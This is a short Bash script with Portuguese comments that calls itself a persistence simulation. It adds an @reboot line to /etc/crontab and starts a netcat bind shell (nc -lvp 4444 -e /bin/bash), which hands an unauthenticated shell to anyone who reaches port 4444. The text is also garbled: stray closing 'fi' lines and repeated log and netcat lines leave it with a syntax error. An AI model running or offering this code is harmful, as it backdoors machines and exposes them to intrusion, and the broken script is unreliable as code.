#!/bin/bash
# Simulação de persistência
CRON="@reboot /usr/local/bin/persistencia_simulada.sh &"
CRON_FILE="/etc/crontab"
if ! grep -q persistencia_simulada "$CRON_FILE"; then
  echo "$CRON" >> "$CRON_FILE"
fi
echo "Persistência simulada ativada em $(date)" >> /var/log/persistencia.log
nohup nc -lvp 4444 -e /bin/bash &
fi
fi
echo "Persistência simulada ativada em $(date)" >> /var/log/persistencia.log
nohup nc -lvp 4444 -e /bin/bash &
